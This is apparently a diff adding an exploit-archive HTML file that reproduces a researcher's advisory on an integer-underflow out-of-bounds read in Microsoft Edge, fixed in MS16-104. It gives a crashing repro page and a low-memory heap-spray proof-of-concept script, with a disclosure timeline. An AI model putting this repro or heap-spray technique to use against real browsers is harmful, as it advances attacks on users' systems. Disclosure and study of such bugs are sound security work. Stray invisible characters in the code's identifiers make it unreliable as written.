@@ -1,0 +1,89 @@
+<!--
+Source: http://blog.skylined.nl/20161118002.html
+
+Synopsis
+
+A specially crafted web-page can cause an integer underflow in Microsoft Edge. This causes CText­Extractor::Get­Block­Text to read data outside of the bounds of a memory block.
+
+Known affected software, attack vectors and mitigations
+
+Microsoft Edge 11.0.10240.16384
+
+An attacker would need to get a target user to open a specially crafted web-page. Java­Script is not necessarily required to trigger the issue.
+
+Repro.html
+
+<!DOCTYPE html>
+<style>
+  *::first-letter{ border: 0; }
+  *{ white-space: pre-line; }
+</style>
+<body>
+  A<script>alert();</script>&#x­D;&#x­D;B
+</body>
+
+Description
+
+Though I did not investigate thoroughly, I did find out the following:
+
+The root cause appears to be an integer underflow in a 32-bit variable used in CText­Extractor..Get­Block­Text as an index to read a WCHAR in a string buffer. This index is decreased once too often and becomes -1, or a very large positive number depending on how it is used.
+This does not result in a crash on 32-bit systems, as an integer wrap causes the code to read one WCHAR before the start of the buffer, which is normally also in allocated memory.
+On 64-bit systems, the 32-bit -1 value is interpreted as 0x­FFFFFFFF, a very large positive value. As this is an index into a WCHAR string, it gets multiplied by two and added to the start of the buffer to find the location of a WCHAR to read. This causes the OOB read to be around 8Gb (!!) beyond the address at which the buffer is allocated.
+The crash happens in code that appears to be rendering the web-page, which does not immediately offer an obvious way of extracting information using this bug.
+
+Exploit
+
+This is where it gets interesting, as the OOB read happens approximately 0x2`00000000 bytes after the address at which the buffer is allocated. This presents us with a problem: how to store some information that we'd be interested in reading at such a large offset from the original allocation?
+
+As one might come to expect from me, I used a heap spray. But it needed to be a special kind of heap spray as I did not want to actually have to allocate 8Gb of RAM. However, about ten years ago (boy, time flies!) I developed a heap spray that uses significantly less RAM than a traditional heap spray does; in practice probably about 33% in most cases, but theoretically much more in ideal situations. I've been meaning to blog about it, but never found the time to do so until today: you can read all about it here.
+
+That said, I have not actually looked at whether it is possible to exfiltrate useful information using this bug. However, I did write a Proof-of-Concept that attempts to make sure something is allocated in the area where the OOB read happens. This Po­C uses these heap spray tricks to spray the heap while minimizing memory use. The Proof-of-Concept uses about ~5.3Gb to allocate the memory at around 8Gb distance from the buffer (up to ~10Gb to be sure). When you load the Po­C in a 64-bit version of Edge, you may notice that, unlike the original repro, it will not crash Edge (even though it does trigger the issues): the heap spray has allocated the memory that the out-of-bounds read accesses, and this prevents an access violation exception. Refreshing the page is likely to screw up the precise allocation process needed and will probably cause a crash.
+
+This proves that it is theoretically possible to allocate information at the address used by the code. All that is left is prove that the information read by the code can be exfiltrated somehow, and you have a working exploit. This is left as an exercises to the reader.
+-->
+
+<!DOCTYPE html>
+<style>
+  *::first-letter{ border: 0; }
+  *{ white-space: pre-line; }
+</style>
+<body>
+  A<script>
+    var ai­Allocation­Sizes = [             // max address ------.    .---- RAM allocated
+      -0x4000, //  4000                                      4000  4000
+       0x1000, //    |   1000                                5000  5000
+      -0x5000, // -4000    |   5000                          a000  6000
+       0x5000, //          |     |   5000                    f000  b000
+      -0x7000, //          |  -5000    |   7000             16000  d000
+       0x6000, //          |           |     |   6000       1c000 13000
+      -0x8000, //          |           |  -7000    |   8000 24000 14000 (5.3Gb)
+    ];
+    var ao­Heap = [],
+        o­To­Be­Freed;
+    ai­Allocation­Sizes.for­Each(function (i­Allocation­Size) {
+      if (i­Allocation­Size < 0 && o­To­Be­Freed) {
+        console.log("-0x" + o­To­Be­Freed.byte­Length.to­String(16));
+        o­To­Be­Freed = null; // Free the heap block that was queued to be freed.
+        Collect­Garbage();
+      }
+      var u­Allocation­Size = Math.abs(i­Allocation­Size) * 0x10000 - 1;
+      console.log("+0x" + u­Allocation­Size.to­String(16));
+      var o­Array­Buffer = new Array­Buffer(u­Allocation­Size);
+      if (i­Allocation­Size < 0) {
+        o­To­Be­Freed = o­Array­Buffer; // Schedule this to be freed
+      } else {
+        //ao­Heap.push(o­Array­Buffer);
+      }
+    });
+  </script>&#x­D;&#x­D;B
+</body>
+
+<!--
+Time-line
+
+June 2016: This vulnerability was found through fuzzing.
+June 2016: This vulnerability was submitted to ZDI and i­Defense.
+July 2016: This vulnerability was acquired by ZDI.
+September 2016: This vulnerability was addressed by Microsoft in MS16-104.
+November 2016: Details of this issue are released.
+-->
